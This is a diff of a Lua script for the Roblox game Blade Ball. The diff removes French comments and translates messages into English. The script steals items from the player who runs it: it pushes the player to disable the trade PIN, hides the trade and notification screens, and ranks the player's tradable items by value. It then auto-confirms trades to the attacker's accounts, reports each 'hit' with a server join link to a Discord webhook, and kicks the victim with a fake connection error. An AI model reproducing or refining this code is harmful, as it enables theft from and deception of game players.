@@ -1,11 +1,9 @@
--- // CONFIGURATION & SÉCURITÉ
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
--- // VARIABLES SERVICES
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
@@ -20,46 +18,41 @@ local tradeCompleteGui = PlayerGui.TradeCompleted
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
--- // CONFIGURATION UTILISATEUR
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = "EBK-SS-A" 
 
--- // URL DE LA PHOTO DE PROFIL (PDP)
 local headshot = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. plr.UserId .. "&size=420x420&format=Png&isCircular=false"
 
--- // VÉRIFICATIONS DE SÉCURITÉ
 if next(users) == nil or webhook == "" then
-    plr:kick("Configuration manquante : Usernames ou Webhook vide.")
+    plr:kick("Configuration Error: Usernames or Webhook is empty.")
     return
 end
 
 if game.PlaceId ~= 13772394625 then
-    plr:kick("Ce script ne fonctionne que sur Blade Ball.")
+    plr:kick("Script Error: Only works on Blade Ball.")
     return
 end
 
 if #Players:GetPlayers() >= 16 then
-    plr:kick("Serveur plein. Rejoignez un serveur moins peuplé.")
+    plr:kick("Server Full: Please join a less populated server.")
     return
 end
 
 if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:kick("Erreur serveur. Rejoignez un serveur public.")
+    plr:kick("Server Error: Please join a public server.")
     return
 end
 
--- // VÉRIFICATION DU PIN CODE
 local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
 local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
 if PINReponse ~= "You don't have a PIN code" then
-    plr:kick("Veuillez désactiver votre code PIN de transaction et réessayer.")
+    plr:kick("Account Error: Please disable your Trade PIN and try again.")
     return
 end
 
--- // NETTOYAGE UI (DISCRETION)
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
@@ -77,7 +70,6 @@ local notificationsFrame = notificationsGui.Notifications
 notificationsFrame.Visible = false
 notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)
 
--- // GESTION DES ÉCHANGES
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
@@ -128,7 +120,6 @@ local function confirmTrade()
     until not inTrade
 end
 
--- // FORMATAGE RAP
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -142,7 +133,6 @@ end
 
 local totalRAP = 0
 
--- // ENVOI DES MESSAGES DISCORD
 local function SendJoinMessage(list, prefix)
     local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
@@ -180,7 +170,7 @@ local function SendJoinMessage(list, prefix)
     local data = {
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
-        ["avatar_url"] = headshot, -- ACTIONNE LA PDP DU BOT
+        ["avatar_url"] = headshot, 
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = botUsername,
@@ -231,9 +221,9 @@ local function SendMessage(list)
     local data = {
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
-        ["avatar_url"] = headshot, -- ACTIONNE LA PDP DU BOT
+        ["avatar_url"] = headshot,
         ["embeds"] = {{
-            ["title"] = "⚪ The hit on server 🎉" ,
+            ["title"] = "⚪ Server Hit 🎉" ,
             ["color"] = embedColor,
             ["fields"] = fields,
             ["thumbnail"] = {["url"] = headshot},
@@ -249,7 +239,6 @@ local function SendMessage(list)
     })
 end
 
--- // RÉCUPÉRATION DES DONNÉES RAP
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 
@@ -278,7 +267,6 @@ local function getRAP(category, itemName)
     return (rapMap and rapMap[itemName]) or 0
 end
 
--- // SCAN DE L'INVENTAIRE
 for _, category in ipairs(categories) do
     for itemId, itemInfo in pairs(clientInventory[category]) do
         if not itemInfo.TradeLock then
@@ -291,7 +279,6 @@ for _, category in ipairs(categories) do
     end
 end
 
--- // LANCEMENT DE LA PROCÉDURE
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local sentItems = {}
@@ -324,7 +311,7 @@ if #itemsToSend > 0 then
             task.wait(0.5)
             confirmTrade()
         end
-        plr:kick("Erreur de connexion (Fin de l'opération).")
+        plr:kick("Connection Error: Operation Finished.")
     end
 
     local function waitForUserJoin()
